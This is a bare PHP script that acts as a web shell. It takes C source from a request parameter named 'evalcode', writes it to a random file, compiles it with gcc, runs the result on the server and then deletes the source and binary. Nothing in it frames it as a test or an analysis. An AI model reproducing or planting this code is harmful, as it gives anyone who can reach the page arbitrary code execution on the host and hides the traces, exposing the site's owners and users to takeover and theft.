<?php
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('popen')){
		$s_f = @popen($s_c, 'r');
		if($s_f){
			while(!feof($s_f)){
				$s_out .= fread($s_f, 2096);
			}
			pclose($s_f);
		}	
	}
	return $s_out;
}

$_GP = array_merge($_POST, $_GET);
$s_code = $_GP['evalcode'];
$s_script = md5(time().rand(0,100));
if(file_put_contents($s_script.".c", $s_code)!==false){
	$s_scriptout = $s_script;
	$s_res = exe("gcc ".$s_script.".c -o ".$s_scriptout);
	if(@is_file($s_scriptout)){
		$s_res = exe("chmod +x ".$s_scriptout." ; ./".$s_scriptout);
		rename($s_scriptout, $s_scriptout."del");
		unlink($s_scriptout."del");
	}
	unlink($s_script.".c");
}
?>